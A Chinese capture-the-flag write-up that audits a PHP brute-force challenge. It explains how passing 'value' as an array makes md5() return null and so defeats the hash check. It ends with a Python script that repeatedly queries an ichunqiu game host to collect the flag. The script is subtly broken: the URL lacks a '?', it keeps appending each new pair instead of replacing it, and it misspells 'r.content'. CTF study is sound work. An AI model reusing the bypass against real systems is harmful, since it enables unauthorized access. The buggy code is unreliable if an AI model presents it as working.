# 爆破-3

## Description

这个真的是爆破。

## Solution

打开网站，是一段 php 代码：

```php
<?php 
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){
  session_destroy();
}

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];

if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
}

if($_SESSION['nums']>=10){
  echo $flag;
}

show_source(__FILE__);
?>
```

那么这就是一段代码审计，只要第一次传入的 value 值和 SESSION 的 whoami 一样，则会 nums 的数量加一，页面会显示两个新的字符。我们再把这两个字符重新传入。通过 md5 函数无法对数组进行处理的漏洞来绕过 substr(md5($value), 5, 4) == 0 的判断。

这里有两种做法，可以手动地传入 value，格式为 ?value[]=ea，然后请求 10次就可以了，或者使用脚本，注意这里时间如果超过2分钟 session 就会被销毁掉。

```python
import requests

url = "http://50bfa81ec60b4ce988c6aa9c7bc3844fe82b145d95704b9a.game.ichunqiu.com/value[]="
s = requests.session()
r = s.get(url + "ea")
for i in range(20):
    url = url + r.content[0:2]
    r = s.get(url)
    if "flag" in r.content:
        print(r.conten)
        exit()
``` 